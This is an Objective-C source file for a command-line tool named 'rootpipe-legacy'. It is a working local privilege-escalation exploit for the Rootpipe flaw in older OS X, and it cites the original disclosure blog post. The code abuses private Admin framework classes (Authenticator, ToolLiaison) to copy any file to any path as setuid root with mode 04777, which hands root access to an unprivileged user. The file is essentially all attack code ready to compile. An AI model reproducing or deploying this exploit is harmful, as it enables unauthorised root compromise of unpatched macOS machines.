#import <Foundation/Foundation.h>
#import <SecurityFoundation/SFAuthorization.h>

#include <objc/runtime.h>
#include <dlfcn.h>

int main(int argc, const char *argv[])
{
	if (argc != 3)
	{
		fprintf(stderr, "usage: rootpipe-legacy source target\n");
		
		return EXIT_FAILURE;
	}
	
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	
	BOOL isDir;
	
	if (![[NSFileManager defaultManager] fileExistsAtPath:@(argv[1]) isDirectory:&isDir] || isDir)
	{
		fprintf(stderr, "Invalid source.\n");
		
		return EXIT_FAILURE;
	}
	
	
	// https://truesecdev.wordpress.com/2015/04/09/hidden-backdoor-api-to-root-privileges-in-apple-os-x/
	
	dlopen("/System/Library/PrivateFrameworks/Admin.framework/Versions/A/Admin", RTLD_LAZY | RTLD_GLOBAL);
	
	id authent = [objc_lookUpClass("Authenticator") sharedAuthenticator];
	
	SFAuthorization *authref = [SFAuthorization authorization];
	
	[authent authenticateUsingAuthorizationSync:authref];
	
	id st = [objc_lookUpClass("ToolLiaison") sharedToolLiaison];
	id tool = [st tool];
	
	[tool createFileWithContents:[NSData dataWithContentsOfFile:@(argv[1])] path:@(argv[2]) attributes:@{ NSFilePosixPermissions: @04777 }];
	
	
	[pool drain];
	
	return EXIT_SUCCESS;
}
